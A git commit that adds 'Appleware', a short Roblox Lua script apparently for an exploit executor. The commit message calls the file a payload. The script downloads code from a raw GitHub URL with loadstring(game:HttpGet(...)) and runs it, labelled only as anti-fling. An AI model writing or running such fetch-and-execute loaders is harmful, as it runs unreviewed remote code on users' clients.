a267e25865e6a0424fb0be00538c193242a1d40b
Toolboxhubbot <yesking1821@gmail.com>
2026-09-18 17:48:24 +1000

    Add Appleware script payload

---
+++ appleware.lua
@@ -0,0 +1,7 @@
+-- Auto-load Anti-Fling
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Toolboxhubbot/antifling/refs/heads/main/antifling"))()
+end)
+
+LocalTeleportService = game:GetService("TeleportService")
+print("Appleware loaded - enjoy my script, love you though (made by word)")
